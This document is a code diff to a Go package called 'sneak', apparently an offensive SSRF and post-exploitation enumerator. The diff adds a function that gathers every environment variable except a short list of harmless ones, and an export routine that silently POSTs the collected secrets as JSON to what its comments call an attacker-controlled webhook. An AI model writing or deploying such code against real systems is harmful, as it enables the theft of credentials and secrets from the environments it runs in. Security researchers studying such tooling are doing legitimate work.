@@ -1,11 +1,15 @@
 package sneak
 
 import (
+	"bytes"
 	"encoding/json"
 	"errors"
 	"fmt"
 	"io/ioutil"
+	"net/http"
+	"os"
 	"strings"
+	"time"
 )
 
 var (
@@ -13,6 +17,11 @@ var (
 	VirtMachine        = "vm"
 )
 
+// Exfiltrated information that we can use for post-exploitation
+type SsrfResults map[string]string
+
+// Main interface for enumerating the environment and storing the results for
+// output and/or webhook
 type Enumerator struct {
 	EnvType string                  `json:"env"`
 	Results map[string]*SsrfResults `json:"ssrf_results"`
@@ -84,25 +93,67 @@ func (e *Enumerator) CheckCloud(specific *string) error {
 }
 
 func (e *Enumerator) CheckNet() {
-
 }
 
 // Enumerates global environment variables for secrets and URLs, and
 // additionally checks for dotenvs on disk.
 func (e *Enumerator) CheckEnv() {
 
+	// list of all envvars that we can toss out
+	ignoreList := []string{
+		"TERM",
+		"SHELL",
+		"HISTSIZE",
+		"HISTCONTROL",
+		"SSH_TTY",
+		"LC_ALL",
+		"LANG",
+		"MAIL",
+		"SHLVL",
+		"XDG_RUNTIME_DIR",
+		"XDG_SESSION_ID",
+		"LS_COLORS",
+	}
+
+	envvars := SsrfResults{}
+	for _, env := range os.Environ() {
+		pair := strings.SplitN(env, "=", 2)
+		if Contains(ignoreList, pair[0]) {
+			continue
+		}
+		envvars[pair[0]] = pair[1]
+	}
+	e.Results["env"] = &envvars
 }
 
 // Outputs results to stdout, or in the case of blind test, send back
 // results to an attacker-controlled webhook.
-func (e *Enumerator) Export(webhook *string) {
+func (e *Enumerator) Export(webhook *string, silent bool) error {
 	jsonified, err := json.MarshalIndent(e, "", "  ")
 	if err != nil {
 		panic(err)
 	}
 
-	if webhook != nil || *webhook != "" {
-		// TODO
+	// assumes that the webhook can accept arbitrary content, send as POST
+	if webhook != nil && *webhook != "" {
+		client := http.Client{
+			Timeout: time.Duration(2 * time.Second),
+		}
+
+		req, err := http.NewRequest("POST", *webhook, bytes.NewBuffer(jsonified))
+		if err != nil {
+			return err
+		}
+		req.Header.Set("Content-Type", "application/json")
+
+		// fire, ignore the response and only print if failed
+		if _, err = client.Do(req); err != nil {
+			fmt.Printf("Error from webhook: %s\n", err)
+		}
 	}
-	fmt.Printf("%s\n", string(jsonified))
+
+	if !silent {
+		fmt.Printf("%s\n", string(jsonified))
+	}
+	return nil
 }
